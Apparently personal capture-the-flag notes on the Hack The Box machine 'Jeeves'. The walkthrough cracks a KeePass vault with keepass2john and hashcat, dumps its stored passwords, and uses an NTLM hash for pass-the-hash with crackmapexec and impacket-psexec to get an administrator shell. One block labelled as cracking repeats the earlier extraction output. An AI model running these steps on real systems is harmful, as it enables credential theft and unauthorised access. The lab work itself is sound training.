# Alternative Routes
- Turns out juicy potato wasn't the intended route
- There is a keepass file in the users documents folder
- Importantly, WinPEAS would not have caught this!
	- Always hunt about the file system of any users quickly first

```
C:\Users\kohsuke\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   7,178,801,152 bytes free

```

- We copy that to our box via smb and run keepass2john
```
┌──(kali㉿kali)-[~/oscp/boxes/htb/jeeves]
└─$ keepass2john CEH.kdbx                                                                                                                                                                1 ⨯
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

- We can then crack it (we have to delete the CEH from the front for hashcat)
```
┌──(kali㉿kali)-[~/oscp/boxes/htb/jeeves]
└─$ keepass2john CEH.kdbx                                                                                                                                                                1 ⨯
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

- PWD is moonshine1
```
cal@Vivobook:~/notes/oscp-notes/boxes/htb/jeeves$ sudo hashcat --force -m 13400 -a 0 CEH.hash /home/cal/projects/htb/leak/rockyou.txt
[...]
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1

```

![[Pasted image 20220802150856.png]]

- Exporting the contents to a CSV
```
┌──(kali㉿kali)-[~/oscp/boxes/htb/jeeves]
└─$ keepassxc-cli export -f csv CEH.kdbx
Enter password to unlock CEH.kdbx:
"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
"CEH","Walmart.com","anonymous","Password","http://www.walmart.com","Getting my shopping on","","0","2017-09-18T17:38:16Z","2017-09-16T02:16:31Z"
"CEH","Bank of America","Michael321","12345","https://www.bankofamerica.com","","","0","2017-09-18T17:38:42Z","2017-09-16T02:16:31Z"
"CEH","It's a secret","admin","F7WhTrSFDKB6sxHU1cUn","http://localhost:8180/secret.jsp","","","0","2017-09-18T17:39:24Z","2017-09-18T17:38:45Z"
"CEH","EC-Council","hackerman123","pwndyouall!","https://www.eccouncil.org/programs/certified-ethical-hacker-ceh","Personal login","","0","2017-09-18T17:40:19Z","2017-09-18T17:39:35Z"
"CEH","Keys to the kingdom","bob","lCEUnYPjNfIuPZSzOySA","","","","0","2017-09-18T17:40:34Z","2017-09-18T17:40:22Z"
"CEH","DC Recovery PW","administrator","S1TjAtJHKsugh9oC4VZl","","","","0","2017-09-18T17:41:03Z","2017-09-18T17:40:37Z"
"CEH","Jenkins admin","admin","","http://localhost:8080","We don't even need creds! Unhackable! ","","0","2017-09-18T17:41:57Z","2017-09-18T17:41:08Z"
"CEH","Backup stuff","?","aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00","","","","0","2017-09-18T17:42:53Z","2017-09-18T17:42:06Z"

```

- Hash doesn't crack, but we can PtH with cme
```
┌──(kali㉿kali)-[~/oscp/boxes/htb/jeeves]
└─$ crackmapexec smb 10.10.10.63 -u 'Administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00' --local-auth
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:JEEVES) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] JEEVES\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)

```

- Get shell
```
┌──(kali㉿kali)-[~/oscp/boxes/htb/jeeves]
└─$ impacket-psexec Administrator:@10.10.10.63 -hashes e0fb1fb85756c24235ff238cbe81fe00:e0fb1fb85756c24235ff238cbe81fe00                                                                 1 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file athBRVEs.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service JCJb on 10.10.10.63.....
[*] Starting service JCJb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```